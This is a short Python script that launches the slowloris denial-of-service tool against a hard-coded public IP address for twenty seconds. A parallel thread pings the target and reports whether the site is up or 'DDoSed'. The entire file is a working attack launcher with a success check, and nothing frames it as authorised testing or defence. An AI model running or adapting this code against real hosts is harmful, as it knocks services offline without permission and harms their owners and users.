import subprocess, threading, time, os, signal
from threading import Thread
from slowloris import *
IP = '137.74.193.103'


def sl():
    proc = subprocess.Popen(["slowloris " + IP],
                            shell=True)
    time.sleep(20)
    proc.kill()


def ping():
    time.sleep(10)
    ping_command = "ping -c 5 -n -W 4 " + IP
    (output, error) = subprocess.Popen(ping_command,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       shell=True).communicate()
    if output:
        print 'Website is OK'
    else:
        print 'Website is DDoSed'


if __name__ == '__main__':

    Thread(target = sl).start()
    Thread(target = ping).start()